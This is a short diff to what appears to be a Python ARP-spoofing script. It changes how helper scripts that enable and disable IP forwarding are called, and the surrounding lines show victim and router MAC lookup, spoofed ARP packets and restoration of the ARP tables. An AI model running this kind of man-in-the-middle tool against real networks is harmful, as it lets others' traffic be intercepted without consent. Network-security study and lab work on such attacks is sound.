@@ -16,7 +16,7 @@ def main():
 	victimMAC = getmacbyip(victimIP)
 	routerMAC = getmacbyip(routerIP)
 	
-	subprocess.run(["bash", "EnableIPForwarding.sh"], check=True) # Set IP forwarding flag to forward packets on behalf of other machines
+	subprocess.run(["./EnableIPForwarding.sh"], check=True) # Set IP forwarding flag to forward packets on behalf of other machines
 	
 	try:
 		print("Sending spoofed ARP packets")
@@ -27,7 +27,7 @@ def main():
 		print("Restoring ARP tables")
 		arp_restore(routerIP, routerMAC, victimIP, victimMAC)
 		arp_restore(victimIP, victimMAC, routerIP, routerMAC)
-		subprocess.run(["bash", "DisableIPForwarding.sh"], check=True)
+		subprocess.run(["./DisableIPForwarding.sh"], check=True)
 		quit()
 
 if __name__ == "__main__":
